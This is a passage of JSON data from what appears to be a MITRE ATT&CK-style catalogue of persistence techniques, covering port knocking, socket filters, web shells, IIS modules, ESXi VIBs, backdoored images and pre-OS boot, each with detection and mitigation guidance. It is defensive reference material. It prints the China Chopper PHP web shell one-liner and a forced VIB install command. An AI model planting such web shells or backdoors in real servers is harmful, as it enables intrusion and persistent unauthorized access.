href=\"https://gitlab.com/wireshark/wireshark/-/wikis/WakeOnLAN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitLab WakeOnLAN)</a>","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["Network Traffic: Network Traffic Content","Network Traffic: Network Connection Creation","Process: Process Creation","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1037","name":"Filter Network Traffic","description":"Mitigation of some variants of this technique could be achieved through the use of stateful firewalls, depending upon how it is implemented."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable Wake-on-LAN if it is not needed within an environment."}],"subTechniques":[{"id":"T1205.001","name":"Port Knocking","description":"Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.\n\nThis technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r <a href=\"https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hartrell cd00r 2002)</a>, is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.","detection":"Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["Network Traffic: Network Connection Creation","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1037","name":"Filter Network Traffic","description":"Mitigation of some variants of this technique could be achieved through the use of stateful firewalls, depending upon how it is implemented."}]},{"id":"T1205.002","name":"Socket Filters","description":"Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the <code>libpcap</code> library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria. <a href=\"http://recursos.aldabaknocking.com/libpcapHakin9LuisMartinGarcia.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: haking9 libpcap network sniffing)</a> Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with Protocol Tunneling. <a href=\"https://exatrack.com/public/Tricephalic_Hellkeeper.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: exatrack bpf filters passive backdoors)</a> <a href=\"https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Leonardo Turla Penquin May 2020)</a>\n\nFilters can be installed on any Unix-like platform with <code>libpcap</code> installed or on Windows hosts using <code>Winpcap</code>.  Adversaries may use either <code>libpcap</code> with <code>pcap_setfilter</code> or the standard library function <code>setsockopt</code> with <code>SO_ATTACH_FILTER</code> options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.","detection":"Identify running processes with raw sockets. Ensure processes listed have a need for an open raw socket and are in accordance with enterprise policy. <a href=\"https://www.crowdstrike.com/blog/how-to-hunt-for-decisivearchitect-and-justforfun-implant/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: crowdstrike bpf socket filters)</a>","platforms":["Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1037","name":"Filter Network Traffic","description":"Mitigation of some variants of this technique could be achieved through the use of stateful firewalls, depending upon how it is implemented."}]}]},{"id":"T1505","name":"Server Software Component","description":"Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications. <a href=\"https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: volexity_0day_sophos_FW)</a>","detection":"Consider monitoring application logs for abnormal behavior that may indicate suspicious installation of application software components. Consider monitoring file locations associated with the installation of new application software components such as paths from which applications typically load such extensible components.\n\nProcess monitoring may be used to detect servers components that perform suspicious actions such as running cmd.exe or accessing files. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. <a href=\"https://www.us-cert.gov/ncas/alerts/TA15-314A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT Alert TA15-314A Web Shells)</a>","platforms":["Windows","Linux","macOS","Network Devices","ESXi"],"dataSources":["Network Traffic: Network Traffic Flow","Application Log: Application Log Content","File: File Modification","File: File Creation","Process: Process Creation","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Enforce the principle of least privilege by limiting privileges of user accounts so only authorized accounts can modify and/or add server software components. <a href=\"https://media.defense.gov/2020/Jun/09/2002313081/-1/-1/0/CSI-DETECT-AND-PREVENT-WEB-SHELL-MALWARE-20200422.PDF\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA and ASD Detect and Prevent Web Shells 2020)</a>"},{"id":"M1024","name":"Restrict Registry Permissions","description":"Consider using Group Policy to configure and block modifications to service and other critical server parameters in the Registry. <a href=\"https://social.technet.microsoft.com/wiki/contents/articles/12229.windows-system-services-fundamentals.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft System Services Fundamentals)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Do not allow administrator accounts that have permissions to add component software on these services to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Consider disabling software components from servers when possible to prevent abuse by adversaries. <a href=\"https://itsyndicate.org/blog/disabling-dangerous-php-functions/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ITSyndicate Disabling PHP functions)</a>"},{"id":"M1045","name":"Code Signing","description":"Ensure all application component binaries are signed by the correct application developers."},{"id":"M1046","name":"Boot Integrity","description":"Enabling secure boot allows validation of software and drivers during initial system boot."},{"id":"M1047","name":"Audit","description":"Regularly check component software on critical services that adversaries may target for persistence to verify the integrity of the systems and identify if unexpected changes have been made."}],"subTechniques":[{"id":"T1505.001","name":"SQL Stored Procedures","description":"Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).\n\nAdversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers. <a href=\"https://www.netspi.com/blog/technical-blog/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NetSPI Startup Stored Procedures)</a> <a href=\"https://securelist.com/malicious-tasks-in-ms-sql-server/92167/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky MSSQL Aug 2019)</a> To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server. <a href=\"https://www.netspi.com/blog/technical-blog/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NetSPI Startup Stored Procedures)</a> <a href=\"https://securelist.com/malicious-tasks-in-ms-sql-server/92167/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky MSSQL Aug 2019)</a> <a href=\"https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-2017\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft xp_cmdshell 2017)</a> \n\nMicrosoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.). <a href=\"https://docs.microsoft.com/en-us/sql/relational-databases/clr-integration/common-language-runtime-integration-overview?view=sql-server-2017\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft CLR Integration 2017)</a> Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands. <a href=\"https://www.netspi.com/blog/technical-blog/adversary-simulation/attacking-sql-server-clr-assemblies/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NetSPI SQL Server CLR)</a>","detection":"On a MSSQL Server, consider monitoring for xp_cmdshell usage. <a href=\"https://www.netspi.com/blog/technical-blog/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NetSPI Startup Stored Procedures)</a> Consider enabling audit features that can log malicious startup activities.","platforms":["Windows","Linux"],"dataSources":["Application Log: Application Log Content"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Do not allow administrator accounts that have permissions to add component software on these services to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."},{"id":"M1045","name":"Code Signing","description":"Ensure all application component binaries are signed by the correct application developers."},{"id":"M1047","name":"Audit","description":"Regularly check component software on critical services that adversaries may target for persistence to verify the integrity of the systems and identify if unexpected changes have been made."}]},{"id":"T1505.002","name":"Transport Agent","description":"Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails. <a href=\"https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft TransportAgent Jun 2016)</a> <a href=\"https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET LightNeuron May 2019)</a> Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. \n\nAdversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events. <a href=\"https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET LightNeuron May 2019)</a> Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary.","detection":"Consider monitoring application logs for abnormal behavior that may indicate suspicious installation of application software components. Consider monitoring file locations associated with the installation of new application software components such as paths from which applications typically load such extensible components.","platforms":["Linux","Windows"],"dataSources":["File: File Creation","Application Log: Application Log Content"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Do not allow administrator accounts that have permissions to add component software on these services to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."},{"id":"M1045","name":"Code Signing","description":"Ensure all application component binaries are signed by the correct application developers."},{"id":"M1047","name":"Audit","description":"Regularly check component software on critical services that adversaries may target for persistence to verify the integrity of the systems and identify if unexpected changes have been made."}]},{"id":"T1505.003","name":"Web Shell","description":"Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. <a href=\"https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: volexity_0day_sophos_FW)</a>\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. China Chopper Web shell client). <a href=\"https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Lee 2013)</a>","detection":"Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: <a href=\"https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Lee 2013)</a> \n\n<code>&amp;lt;?php @eval($_POST['password']);&amp;gt;</code>\n\nNevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as spawning cmd.exe or accessing files that are not in the Web directory. <a href=\"https://github.com/nsacyber/Mitigating-Web-Shells\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA Cyber Mitigating Web Shells)</a>\n\nFile monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. <a href=\"https://github.com/nsacyber/Mitigating-Web-Shells\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA Cyber Mitigating Web Shells)</a>\n\nLog authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. <a href=\"https://www.us-cert.gov/ncas/alerts/TA15-314A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT Alert TA15-314A Web Shells)</a>","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["Application Log: Application Log Content","Process: Process Creation","File: File Creation","Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow","File: File Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Enforce the principle of least privilege by limiting privileges of user accounts so only authorized accounts can modify the web directory. <a href=\"https://media.defense.gov/2020/Jun/09/2002313081/-1/-1/0/CSI-DETECT-AND-PREVENT-WEB-SHELL-MALWARE-20200422.PDF\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA and ASD Detect and Prevent Web Shells 2020)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Consider disabling functions from web technologies such as PHP’s <code>evaI()</code> that may be abused for web shells. <a href=\"https://itsyndicate.org/blog/disabling-dangerous-php-functions/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ITSyndicate Disabling PHP functions)</a>"}]},{"id":"T1505.004","name":"IIS Components","description":"Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>, and (optionally) <code>Terminate{Extension/Filter}</code>. IIS modules may also be installed to extend IIS web servers. <a href=\"https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms525172(v=vs.90)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft ISAPI Extension Overview 2017)</a> <a href=\"https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms524610(v=vs.90)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft ISAPI Filter Overview 2017)</a> <a href=\"https://web.archive.org/web/20170106175935/http:/esec-lab.sogeti.com/posts/2011/02/02/iis-backdoor.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: IIS Backdoor 2011)</a> <a href=\"https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/the-curious-case-of-the-malicious-iis-module/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trustwave IIS Module 2013)</a>\n\nAdversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts. <a href=\"https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms524610(v=vs.90)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft ISAPI Filter Overview 2017)</a> <a href=\"https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms525172(v=vs.90)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft ISAPI Extension Overview 2017)</a> <a href=\"https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms525696(v=vs.90)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft ISAPI Extension All Incoming 2017)</a> <a href=\"https://www.secureworks.com/research/threat-group-3390-targets-organizations-for-cyberespionage\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Dell TG-3390)</a> <a href=\"https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/the-curious-case-of-the-malicious-iis-module/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trustwave IIS Module 2013)</a> <a href=\"https://web.archive.org/web/20140804175025/http:/blogs.technet.com/b/mmpc/archive/2012/10/03/malware-signed-with-the-adobe-code-signing-certificate.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MMPC ISAPI Filter 2012)</a>\n\nAdversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports <code>RegisterModule</code>, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests. <a href=\"https://docs.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft IIS Modules Overview 2007)</a> <a href=\"https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/the-curious-case-of-the-malicious-iis-module/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trustwave IIS Module 2013)</a> <a href=\"https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Anatomy-Of-Native-Iis-Malware-wp.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET IIS Malware 2021)</a>","detection":"Monitor for creation and/or modification of files (especially DLLs on webservers) that could be abused as malicious ISAPI extensions/filters or IIS modules. Changes to <code>%windir%\\system32\\inetsrv\\config\\applicationhost.config</code> could indicate an IIS module installation. <a href=\"https://docs.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft IIS Modules Overview 2007)</a> <a href=\"https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Anatomy-Of-Native-Iis-Malware-wp.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET IIS Malware 2021)</a>\n\nMonitor execution and command-line arguments of <code>AppCmd.exe</code>, which may be abused to install malicious IIS modules. <a href=\"https://docs.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft IIS Modules Overview 2007)</a> <a href=\"https://researchcenter.paloaltonetworks.com/2018/01/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 RGDoor Jan 2018)</a> <a href=\"https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Anatomy-Of-Native-Iis-Malware-wp.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET IIS Malware 2021)</a>","platforms":["Windows"],"dataSources":["File: File Creation","Command: Command Execution","File: File Modification"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Do not allow administrator accounts that have permissions to add IIS components to be used for day-to-day operations that may expose these permissions to potential adversaries and/or other unprivileged systems."},{"id":"M1038","name":"Execution Prevention","description":"Restrict unallowed ISAPI extensions and filters from running by specifying a list of ISAPI extensions and filters that can run on IIS. <a href=\"https://docs.microsoft.com/en-us/iis/configuration/system.webserver/security/isapicgirestriction/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft ISAPICGIRestriction 2016)</a>"},{"id":"M1045","name":"Code Signing","description":"Ensure IIS DLLs and binaries are signed by the correct application developers."},{"id":"M1047","name":"Audit","description":"Regularly check installed IIS components to verify the integrity of the web server and identify if unexpected changes have been made."}]},{"id":"T1505.005","name":"Terminal Services DLL","description":"Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP. <a href=\"https://docs.microsoft.com/windows/win32/termserv/about-terminal-services\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Remote Desktop Services)</a>\n\nWindows Services that are run as a \"generic\" process (ex: <code>svchost.exe</code>) load the service's DLL file, the location of which is stored in a Registry entry named <code>ServiceDll</code>. <a href=\"https://social.technet.microsoft.com/wiki/contents/articles/12229.windows-system-services-fundamentals.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft System Services Fundamentals)</a> The <code>termsrv.dll</code> file, typically stored in <code>%SystemRoot%\\System32\\</code>, is the default <code>ServiceDll</code> value for Terminal Services in <code>HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\</code>.\n\nAdversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts. <a href=\"https://x.com/james_inthe_box/status/1150495335812177920\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: James TermServ DLL)</a> Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal <code>termsrv.dll</code> functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent Remote Desktop Protocol sessions by either patching the <code>termsrv.dll</code> file or modifying the <code>ServiceDll</code> value to point to a DLL that provides increased RDP functionality. <a href=\"http://woshub.com/how-to-allow-multiple-rdp-sessions-in-windows-10/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows OS Hub RDP)</a> <a href=\"https://github.com/stascorp/rdpwrap\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RDPWrap Github)</a> On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.","detection":"Monitor for changes to Registry keys associated with <code>ServiceDll</code> and other subkey values under <code>HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\</code>.\n\nMonitor unexpected changes and/or interactions with <code>termsrv.dll</code>, which is typically stored in <code>%SystemRoot%\\System32\\</code>.\n\nMonitor commands as well as  processes and arguments for potential adversary actions to modify Registry values (ex: <code>reg.exe</code>) or modify/replace the legitimate <code>termsrv.dll</code>.\n\nMonitor module loads by the Terminal Services process (ex: <code>svchost.exe -k termsvcs</code>) for unexpected DLLs (the default is <code>%SystemRoot%\\System32\\termsrv.dll</code>, though an adversary could also use Match Legitimate Name or Location on a malicious payload).","platforms":["Windows"],"dataSources":["Module: Module Load","Command: Command Execution","File: File Modification","Windows Registry: Windows Registry Key Modification","Process: Process Creation"],"mitigations":[{"id":"M1024","name":"Restrict Registry Permissions","description":"Consider using Group Policy to configure and block modifications to Terminal Services parameters in the Registry. <a href=\"https://social.technet.microsoft.com/wiki/contents/articles/12229.windows-system-services-fundamentals.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft System Services Fundamentals)</a>"},{"id":"M1047","name":"Audit","description":"Regularly check component software on critical services that adversaries may target for persistence to verify the integrity of the systems and identify if unexpected changes have been made."}]},{"id":"T1505.006","name":"vSphere Installation Bundles","description":"Adversaries may abuse vSphere Installation Bundles (VIBs) to establish persistent access to ESXi hypervisors. VIBs are collections of files used for software distribution and virtual system management in VMware environments. Since ESXi uses an in-memory filesystem where changes made to most files are stored in RAM rather than in persistent storage, these modifications are lost after a reboot. However, VIBs can be used to create startup tasks, apply custom firewall rules, or deploy binaries that persist across reboots. Typically, administrators use VIBs for updates and system maintenance.\n\nVIBs can be broken down into three components: <a href=\"https://blogs.vmware.com/vsphere/2011/09/whats-in-a-vib.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: VMware VIBs)</a>\n\n* VIB payload: a <code>.vgz</code> archive containing the directories and files to be created and executed on boot when the VIBs are loaded.  \n* Signature file: verifies the host acceptance level of a VIB, indicating what testing and validation has been done by VMware or its partners before publication of a VIB. By default, ESXi hosts require a minimum acceptance level of PartnerSupported for VIB installation, meaning the VIB is published by a trusted VMware partner. However, privileged users can change the default acceptance level using the <code>esxcli</code> command line interface. Additionally, VIBs are able to be installed regardless of acceptance level by using the <code> esxcli software vib install --force</code> command. \n* XML descriptor file: a configuration file containing associated VIB metadata, such as the name of the VIB and its dependencies.  \n\nAdversaries may leverage malicious VIB packages to maintain persistent access to ESXi hypervisors, allowing system changes to be executed upon each bootup of ESXi – such as using  <code>esxcli</code> to enable firewall rules for backdoor traffic, creating listeners on hard coded ports, and executing backdoors. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022)</a> Adversaries may also masquerade their malicious VIB files as PartnerSupported by modifying the XML descriptor file. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022)</a>","detection":"","platforms":["ESXi"],"dataSources":[],"mitigations":[{"id":"M1045","name":"Code Signing","description":"Enabling the <code>execInstalledOnly</code> feature prevents unsigned binaries from being run on ESXi hosts. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/vmware-detection-containment-hardening\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Threat Intelligence ESXi Hardening 2023)</a>"},{"id":"M1046","name":"Boot Integrity","description":"Enabling secure boot allows ESXi to validate software and drivers during initial system boot. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/vmware-detection-containment-hardening\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Threat Intelligence ESXi Hardening 2023)</a>"},{"id":"M1047","name":"Audit","description":"Periodically audit ESXi hosts to ensure that only approved VIBs are installed. The command <code>esxcli software vib list</code> lists installed VIBs, while the command <code>esxcli software vib signature verify</code> verifies the signatures of installed VIBs. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022)</a>"}]}]},{"id":"T1525","name":"Implant Internal Image","description":"Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike Upload Malware, this technique focuses on adversaries implanting an image in a registry within a victim’s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image. <a href=\"https://rhinosecuritylabs.com/aws/cloud-container-attack-tool/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)</a>\n\nA tool has been developed to facilitate planting backdoors in cloud container images. <a href=\"https://github.com/RhinoSecurityLabs/ccat\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rhino Labs Cloud Backdoor September 2019)</a> If an adversary has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a Web Shell. <a href=\"https://rhinosecuritylabs.com/aws/cloud-container-attack-tool/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)</a>","detection":"Monitor interactions with images and containers by users to identify ones that are added or modified anomalously.\n\nIn containerized environments, changes may be detectable by monitoring the Docker daemon logs or setting up and monitoring Kubernetes audit logs depending on registry configuration.","platforms":["IaaS","Containers"],"dataSources":["Image: Image Metadata","Image: Image Creation","Image: Image Modification"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Limit permissions associated with creating and modifying platform images or containers based on the principle of least privilege."},{"id":"M1045","name":"Code Signing","description":"Several cloud service providers support content trust models that require container images be signed by trusted sources. <a href=\"https://docs.microsoft.com/en-us/azure/container-registry/container-registry-content-trust\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Content trust in Azure Container Registry)</a> <a href=\"https://docs.docker.com/engine/security/trust/content_trust/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Content trust in Docker)</a>"},{"id":"M1047","name":"Audit","description":"Periodically check the integrity of images and containers used in cloud deployments to ensure they have not been modified to include malicious software."}],"subTechniques":[]},{"id":"T1542","name":"Pre-OS Boot","description":"Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control. <a href=\"https://en.wikipedia.org/wiki/Booting\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Booting)</a>\n\nAdversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.","detection":"Perform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes. Take snapshots of boot records and firmware and compare against known good images. Log changes to boot records, BIOS, and 